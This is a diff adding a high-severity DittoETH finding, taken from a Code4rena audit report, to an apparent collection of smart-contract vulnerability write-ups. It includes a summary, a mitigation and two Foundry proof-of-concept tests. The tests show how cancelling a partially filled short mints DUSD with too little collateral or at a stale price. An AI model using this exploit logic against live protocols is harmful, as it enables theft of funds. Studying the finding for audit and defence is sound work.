@@ -1770,3 +1770,85 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 15.[High] Users can mint DUSD with less collateral than required, which gives them free DUSD and may open a liquidatable position
+
+### Mint with less collateral
+
+- Summary: A vulnerability in the DittoETH protocol allows users to mint more DUSD than the collateral they provide by exploiting the `LibOrders.sol` contract, which mints excess DUSD, causes price manipulation, and creates liquidatable positions. When canceling a short order, the protocol incorrectly calculates the required collateral using the short order’s collateral ratio and price, leading to potential under-collateralization. An attacker can exploit this by creating short orders with less than 100% capital, ensuring partial fills, and then canceling to mint DUSD with insufficient collateral. This creates a position that is immediately liquidatable.
+
+- Impact & Recomemdation: Mitigation involves using the initial collateral ratio and current oracle price for accurate collateral calculations and ensuring sufficient collateral before allowing cancellation.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-dittoeth#h-03-users-can-mint-dusd-with-less-collateral-than-required-which-gives-them-free-dusd-and-may-open-a-liquidatable-position) & [Report](https://code4rena.com/reports/2024-03-dittoeth)
+
+<details><summary>POC</summary>
+
+```solidity
+// Make sure to import the types below into the Shorts.t.sol file
+    // import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";
+    function test_MintFreeDUSD() public {
+        // set the initial, penalty and liquidation CRs
+        vm.startPrank(owner);
+        // set below 200 to allow shorter provide less than 100% of debt
+        diamond.setInitialCR(asset, 170);
+        diamond.setPenaltyCR(asset, 120);
+        diamond.setLiquidationCR(asset, 150);
+        vm.stopPrank();
+        // create a bid to match the short and change its state to SR.PartialFill
+        fundLimitBidOpt(1 ether, 0.01 ether, receiver);
+        // create the short providing only 70% of the dusd to be minted
+        uint88 price = 1 ether;
+        depositEth(sender, price.mulU88(5000 ether).mulU88(0.7 ether));
+        uint16[] memory shortHintArray = setShortHintArray();
+        MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
+        vm.prank(sender);
+        diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 70);
+        STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
+        // successfully matches the bid
+        assertTrue(short.status == SR.PartialFill);
+
+        // cancel the short to use up collateral provided and mint dusd
+        vm.prank(sender);
+        cancelShort(101);
+        short = getShortRecord(sender, C.SHORT_STARTING_ID);
+        assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
+        assertEq(short.collateral, 0.01 ether + 0.7 * 2000 ether); // 70% of ETH collateral provided
+        // this SR is liquidatable
+        assertGt( diamond.getAssetNormalizedStruct(asset).liquidationCR, short.collateral.div(short.ercDebt.mul(1 ether)));
+    }
+    function test_MintBelowPrice() public {
+        // create a bid to match the short and change its state to SR.PartialFill
+        fundLimitBidOpt(1 ether, 0.01 ether, receiver);
+        // create the short providing 400% of the dusd to be minted
+        // current initialCR is 500%
+        uint88 price = 1 ether;
+        depositEth(sender, price.mulU88(5000 ether).mulU88(4 ether));
+        uint16[] memory shortHintArray = setShortHintArray();
+        MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
+        vm.prank(sender);
+        diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 400);
+        STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
+        assertTrue(short.status == SR.PartialFill); // CR is partially filled by bid
+
+        // set the new price to 1.5 ether so that price increase
+        uint256 newPrice = 1.5 ether;
+        skip(15 minutes);
+        ethAggregator.setRoundData(
+            92233720368547778907 wei, int(newPrice.inv()) / ORACLE_DECIMALS, block.timestamp, block.timestamp, 92233720368547778907 wei
+        );
+        fundLimitBidOpt(1 ether, 0.01 ether, receiver);
+        assertApproxEqAbs(diamond.getProtocolAssetPrice(asset), newPrice, 15000000150);
+        // cancel the short to mint at 1 ether instead of 1.5 ether
+        vm.prank(sender);
+        cancelShort(101);
+        short = getShortRecord(sender, C.SHORT_STARTING_ID);
+        assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
+        // 2000 dusd minted for 8000 ether (400% at price of 1 ether)
+        // instead of 12000 ether (400% at price of 1.5 ether)
+        assertEq(short.collateral, 0.01 ether + 4*2000 ether);
+        // position is liquidatable
+        assertGt( diamond.getAssetNormalizedStruct(asset).liquidationCR, short.collateral.div(short.ercDebt.mul(1.5 ether)));
+    }
+
+```
+
+</details>
